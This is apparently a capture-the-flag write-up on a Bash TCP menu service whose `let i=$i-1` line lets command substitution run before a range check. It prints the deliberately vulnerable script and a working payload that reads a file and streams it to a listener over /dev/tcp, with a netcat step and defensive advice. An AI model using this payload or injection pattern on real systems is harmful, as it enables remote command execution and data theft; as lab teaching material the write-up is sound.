# Bish Bash Bosh: Bash arithmetic evaluates input before the range check

[По-русски](solve.ru.md)

## 0. Goal and provided files

A tiny Bash TCP service asks for a number from 0 to 2 and prints a corresponding message. The archive includes `server.sh`, `entrypoint.sh`, Dockerfile and compose, plus two command-log fragments. The flag is in `/flag/flag.txt`.

The script attempts to restrict indices by subtracting one from user input, then checking the result. But the input is passed to Bash's **arithmetic evaluator** before the range check.

## 1. Exact vulnerable code

```bash
files=(
  "/flag/flag.txt"
  "msg1"
  "msg2"
  "msg3"
)

echo "What message would you like to see? (0..2)"
read -r i
let i=$i-1

if (( i < 1 || i > 3 )); then
  echo "Nuh uh"
  exit 1
fi

file="${files[i]}"
cat -- "$file"
```

The nominal menu indices map to `files[1]`, `files[2]` and `files[3]`. The sensitive `files[0]` contains the flag, but a straightforward input 0 maps to `i=-1`, which is rejected by the subsequent check. An ordinary negative or out-of-range integer is not sufficient.

The actual issue is `let i=$i-1`. Bash accepts variables, array references and nested arithmetic expressions, and **command substitutions embedded in arithmetic expressions** can be evaluated during expression processing. The malicious input is not evaluated as a simple integer.

## 2. The archived attempt and a verified correction

The archived `evidence/solve_*.txt` contains an **attempted** payload:

```bash
x[$(cat /flag/flag.txt > /dev/tcp/<listener>/4444)]
```

It must **not** be described as a verified working payload. The actual `server.sh` uses **unquoted** expansion in `let i=$i-1`. Spaces in this string cause shell word splitting before `let` receives its argument. A local test of the source's expression showed that the space-containing version fails with a bad array subscript, before the intended command substitution can execute. The archived text records commands but does not record successful callback output for that particular attempt.

A corrected **whitespace-free** form is:

```bash
x[$(cat</flag/flag.txt>/dev/tcp/<listener>/4444)]
```

There are no literal spaces between `cat`, its input redirection and its output redirection. The expression reaches Bash's arithmetic parser as one word. Evaluating the `x[...]` array subscript executes `$(...)` as a side effect. The value that `let` ultimately assigns to `i` does not matter: the file read and redirection occur before the menu's range check.

This difference was verified independently against Bash using a **harmless local filesystem side effect**: the spaced version did not create a marker, and the whitespace-free version did. Run [`scripts/verify_local.sh`](scripts/verify_local.sh) to reproduce this distinction. The original challenge's platform result was recorded as accepted, but the exact successful historical payload was not captured, so this is a validated reproduction rather than a claim about that lost command.

## 3. End-to-end challenge procedure

1. Open a listening TCP socket reachable from the challenge container, e.g. `nc -lvnp 4444`.
2. Connect to the task's text service and wait for the prompt `What message would you like to see? (0..2)`.
3. Send the payload from above as a single line. Replace `<listener>` with the reachable test host.
4. Inspect the listener for the bytes of `/flag/flag.txt`.
5. Submit the recovered flag. The server may still print an arithmetic or range error, which does not invalidate the earlier side effect.

The exact field values in the public payload are masked. The supplied evidence contains unsuccessful or unverified commands with the same `/dev/tcp` redirection pattern; the final solved-task summary independently records an accepted flag.

## 4. Why it works even when the menu rejects the input

A naive assessment would check that the script rejects `i<1` and `i>3`. But validation occurs **after** `let`. A shell arithmetic expression can execute nested syntactic constructs while computing `i`; the side effect happens before `if ((...))` can inspect the resulting integer.

This is a general lesson about command execution embedded in an expression parser, not just a negative-array-index bug.

## 5. Reproduction note and defense

The source file shown above is shipped with the challenge, and the attempted input appears in the archived `evidence`, whereas the corrected whitespace-free form was validated locally. The full interactive transcript from the successful run was not saved in the ZIP, so this writeup cites the mechanism and command without inventing a specific socket log.

Use strict decimal-digit validation on input **before** arithmetic evaluation. For a three-option menu, a plain `case` statement operating on exact strings `0`, `1` and `2` is safer than accepting a user-supplied arithmetic expression.


## Local environment

The original [`Dockerfile`](assets/Dockerfile), [`compose.yml`](assets/compose.yml), [`server.sh`](assets/server.sh) and [`entrypoint.sh`](assets/entrypoint.sh) are preserved together. Run `docker compose up --build` from `ctf/platypwn2026/misc/bishbashbosh/assets` to expose port `9000`. The Compose flag is a **dummy** fixture. Its comments note that some podman-compose versions do not support `configs`. The Docker build was not independently executed during this audit.
